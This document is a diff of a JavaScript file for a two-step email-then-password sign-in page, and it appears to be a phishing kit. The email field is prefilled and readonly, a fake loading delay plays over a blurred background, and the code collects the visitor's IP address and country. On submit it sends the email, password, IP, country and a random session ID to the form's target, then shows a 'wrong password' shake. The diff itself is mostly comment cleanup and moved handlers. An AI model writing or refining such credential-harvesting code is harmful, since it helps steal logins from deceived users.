@@ -1,7 +1,6 @@
 (function () {
-  // Wait for DOM to be fully loaded
   document.addEventListener("DOMContentLoaded", function () {
-    // DOM element references with null checks
+    // DOM elements with null checks
     const elements = {
       emailForm: document.getElementById("emailForm"),
       passwordForm: document.getElementById("passwordForm"),
@@ -21,7 +20,7 @@
       formCountryInput: document.getElementById("formCountryInput"),
     };
 
-    // Check if all required elements exist
+    // Check for missing elements
     const missingElements = Object.keys(elements).filter(
       (key) => !elements[key]
     );
@@ -30,10 +29,9 @@
       return;
     }
 
-    // Function to generate a session ID
+    // Generate session ID
     function generateSessionId() {
-      const chars =
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
       let sessionId = "";
       for (let i = 0; i < 10; i++) {
         sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -41,7 +39,7 @@
       return sessionId;
     }
 
-    // Function to fetch IP information
+    // Fetch IP info
     function getIPInfo() {
       return new Promise((resolve) => {
         fetch("https://ipapi.co/json/")
@@ -73,8 +71,22 @@
       elements.emailInput.value.trim() === ""
     );
 
-    // Email proceed button click handler
+    // Email input real-time validation (even for readonly input)
+    elements.emailInput.addEventListener("input", () => {
+      elements.emailProceed.disabled = elements.emailInput.value.trim() === "";
+      elements.emailError.classList.toggle(
+        "active",
+        elements.emailInput.value.trim() === ""
+      );
+    });
+
+    // Trigger initial validation for readonly input
+    const event = new Event("input");
+    elements.emailInput.dispatchEvent(event);
+
+    // Proceed button click handler
     elements.emailProceed.addEventListener("click", () => {
+      console.log("Proceed button clicked");
       if (elements.emailInput.value.trim() !== "") {
         elements.emailForm.style.display = "none";
         elements.background.style.display = "none";
@@ -85,6 +97,8 @@
           elements.background.style.filter = "blur(3px)";
           elements.passwordForm.style.display = "block";
         }, 3000);
+      } else {
+        console.log("Email input is empty");
       }
     });
 
@@ -99,17 +113,12 @@
         return;
       }
 
-      // Populate hidden fields
       elements.formEmailInput.value = elements.emailInput.value;
-      elements.formSessionId.value =
-        elements.sessionIdElement.textContent.replace("Session ID: ", "");
-      
-      // Fetch IP info and populate hidden fields
+      elements.formSessionId.value = elements.sessionIdElement.textContent; // Removed replace
       const ipInfo = await getIPInfo();
       elements.formIpInput.value = ipInfo.ip;
       elements.formCountryInput.value = ipInfo.country;
 
-      // Submit the form
       const formData = new FormData(elements.loginForm);
       try {
         const response = await fetch(elements.loginForm.action, {
@@ -136,15 +145,6 @@
         elements.passwordInput.classList.add("shake");
         setTimeout(() => elements.passwordInput.classList.remove("shake"), 500);
       }
-    });
-
-    // Real-time email input validation
-    elements.emailInput.addEventListener("input", () => {
-      elements.emailProceed.disabled = elements.emailInput.value.trim() === "";
-      elements.emailError.classList.toggle(
-        "active",
-        elements.emailInput.value.trim() === ""
-      );
     });
   });
 })();
